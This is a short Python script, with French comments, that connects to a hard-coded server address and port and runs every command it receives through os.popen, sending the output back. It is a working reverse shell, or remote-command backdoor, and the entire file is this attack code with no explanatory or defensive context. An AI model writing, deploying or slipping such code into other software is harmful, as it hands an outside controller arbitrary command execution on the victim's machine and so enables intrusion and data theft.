import socket
import os

# Configuration du client
SERVER_IP = '192.168.2.15'
PORT = 8080

def connect_to_server():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((SERVER_IP, PORT))
    print("[+] Connect to the server")

    try:
        while True:
            # Get command from server
            command = client_socket.recv(1024).decode()
            if not command:
                break

            # Execute the command on client
            output = os.popen(command).read()

            client_socket.send(output.encode())
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        print("[-] Disconnect to the server")
        client_socket.close()

if __name__ == "__main__":
    connect_to_server()
